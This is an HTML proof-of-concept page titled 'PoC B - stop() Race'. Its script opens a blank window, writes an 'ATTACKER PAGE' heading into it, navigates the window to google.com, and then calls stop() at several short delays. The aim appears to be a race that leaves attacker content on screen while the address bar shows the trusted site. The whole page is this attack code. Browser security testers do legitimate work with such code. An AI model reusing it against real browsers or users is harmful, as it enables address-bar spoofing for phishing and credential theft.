<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PoC B - stop() Race</title>
</head>
<body>

<h2>Navigation Stop Race</h2>
<button onclick="run()">Run</button>

<script>
const TARGET = "https://www.google.com";

function run() {
  const w = window.open("about:blank");

  setTimeout(() => {
    w.document.write("<h1>ATTACKER PAGE</h1>");

    w.location.href = TARGET;

    [1,5,10,50].forEach(t => {
      setTimeout(() => {
        try { w.stop(); } catch(e){}
      }, t);
    });

  }, 100);
}
</script>

</body>
</html>
